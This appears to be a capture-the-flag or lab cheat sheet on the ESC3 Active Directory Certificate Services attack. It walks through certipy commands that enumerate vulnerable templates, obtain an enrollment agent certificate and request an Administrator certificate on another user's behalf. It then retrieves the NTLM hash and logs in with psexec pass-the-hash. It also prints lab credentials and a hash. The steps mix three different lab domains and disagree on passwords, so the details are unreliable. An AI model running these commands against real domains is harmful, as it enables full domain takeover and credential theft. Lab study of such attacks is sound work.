ESC3 vulnerabilities exploit weaknesses related to Certificate Request Agents, also known as Enrollment Agents. An Enrollment Agent is an account authorized to request certificates _on behalf of_ other users. This functionality is legitimate in scenarios such as helpdesk staff enrolling smart cards for users or for automated certificate provisioning systems. However, if an attacker gains access to an active Enrollment Agent certificate, or if they can enroll for a new Enrollment Agent certificate due to misconfigured template permissions, they can abuse this privilege to obtain certificates for other users, including highly privileged accounts like Domain Administrators.

---
##### Prerequisites

- **Obtaining an Enrollment Agent Certificate:** The attacker must first acquire a certificate that includes the "Certificate Request Agent" EKU (Object Identifier `1.3.6.1.4.1.311.20.2.1`).
- **A Target Certificate Template Allowing Agent Enrollment:** There must be another certificate template (the "target template") that:
	- Issues certificates suitable for authentication (e.g., it includes the "Client Authentication" EKU or "Smart Card Logon" EKU).

---

1. Enumerate ESC3 using certipy-ad

```
certipy-ad find -u sql_svc -p 'REGGIE1234ronnie' -dc-ip 10.129.37.251 -target sequel.htb -vulnerable -enabled

Enrollment Agent                    : True
Extended Key Usage                  : Certificate Request Agent
ESC3 Target Template                : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

Pay attention to templates showing `Enrollment Agent : True` and the `ESC3` vulnerability.

2. **Obtain an Enrollment Agent certificate.** The attacker (`attacker@corp.local`) enrolls for a certificate from the misconfigured `EnrollAgent` template (or an ESC2 "Any Purpose" template).

```
certipy req -u 'cert_admin@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'EnrollAgent'
```

Gained an cert_admin.pfx certificate bundle.

3. Request Administrator Certificate with which I can authenticate using the cert_admin.pfx

```
certipy-ad req -u cert_admin -p 'zebra123' -dc-ip 10.129.76.222 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```

4. Auth with the certificate to get the NTLM Hash of Administrator

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.76.222
```

Connected to DC01 using psexec.

```
impacket-psexec Administrator@dc01.tombwatcher.htb -hashes aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```